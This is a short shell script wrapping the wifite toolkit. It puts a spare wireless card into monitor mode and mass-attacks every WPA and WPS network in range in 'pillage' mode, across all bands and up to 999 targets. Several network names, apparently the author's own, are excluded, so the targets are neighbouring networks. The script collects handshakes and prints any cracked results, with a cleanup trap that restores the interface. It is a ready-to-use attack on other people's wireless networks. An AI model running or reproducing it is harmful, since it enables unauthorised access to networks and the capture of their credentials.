#!/bin/sh
set -e -x

which wifite reaver tshark bully cowpatty hcxpcapngtool hcxdumptool tree

IFACE=$1
if [ -z "${IFACE}" ]; then
  echo "Available interfaces:"
  ls /sys/class/net/
  IFACE=$(ls /sys/class/net/ | grep '^wlan' | grep -v '^wlan0$' | tail -1)
  if [ -z "${IFACE}" ]; then
    echo "No suitable wlan interface found (need wlan* other than wlan0)"
    exit 1
  fi
  echo "Auto-selected: ${IFACE}"
fi

# Always hand the interface back to a usable managed state, however we exit
# (clean finish, error via set -e, or Ctrl-C). wifite only restores on a clean
# exit and never re-adopts the device, which otherwise leaves it stuck as
# type=monitor (and, under iwd, Powered=off) and unusable for normal scanning.
restore_iface() {
  set +e
  # wifite may spawn a separate airmon monitor iface (e.g. ${IFACE}mon); undo both.
  for m in "${IFACE}mon" "${IFACE}"; do
    ip link show "$m" >/dev/null 2>&1 || continue
    sudo ip link set "$m" down
    sudo iw dev "$m" set type managed 2>/dev/null
  done
  sudo ip link set "${IFACE}" up 2>/dev/null
  # Kernel-level restore above is enough for NetworkManager/wpa_supplicant to
  # re-adopt on their own. iwd does NOT auto-repower a device that went to
  # monitor, so nudge it — but only where iwd is actually in use.
  if command -v iwctl >/dev/null 2>&1; then
    sudo iwctl device "${IFACE}" set-property Powered on 2>/dev/null
  fi
}
trap restore_iface EXIT INT TERM

IGNORE="-E radatko.net -E Tashii -E bydlicoin -E radek -E asterix -E guest"
VERBOSITY="-vvvv"
VERBOSITY="-v"

#sudo wifite -i ${IFACE} -5 --wps-only -vvvv --first 999 --pillage 60 --ignore-cracked --skip-crack --ignore-captured
###sudo wifite -i ${IFACE} ${BAND5} --wps-only -vvvv --first 999 --pillage 60 --ignore-cracked --skip-crack --ignore-captured
#sudo wifite -i ${IFACE} -5 --clients-only --wpa --wps -vvvv --first 999 --pillage 300 --ignore-cracked --skip-crack --ignore-captured
sudo wifite -i ${IFACE} ${IGNORE} --allbands --wpa --wps ${VERBOSITY} --first 999 --pillage 300 --ignore-cracked --skip-crack --ignore-captured

cat cracked.json || true
tree hs
